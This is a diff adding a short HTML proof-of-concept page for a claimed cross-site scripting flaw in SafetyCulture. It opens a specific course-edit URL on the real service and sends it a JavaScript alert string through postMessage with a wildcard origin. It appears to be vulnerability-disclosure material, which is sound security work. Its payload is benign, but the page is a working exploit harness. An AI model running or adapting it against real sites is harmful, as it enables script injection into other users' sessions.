@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS POC - SafetyCulture</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        button { padding: 10px 20px; margin: 10px; }
+    </style>
+</head>
+<body>
+    <h1>SafetyCulture XSS Vulnerability Proof</h1>
+    <p>Click the button to demonstrate the security issue:</p>
+    <button onclick="showPOC()">Show XSS Vulnerability</button>
+    
+    <script>
+    function showPOC() {
+        // Open target site
+        const target = window.open(
+            'https://app.eu.safetyculture.com/training/manage/course/68e03861080c66ba8992a5ad/edit',
+            'poc',
+            'width=1000,height=700'
+        );
+        
+        // Execute POC after page loads
+        setTimeout(() => {
+            target.postMessage('alert("🚨 XSS Vulnerability Confirmed")', '*');
+        }, 3000);
+    }
+    </script>
+</body>
+</html>
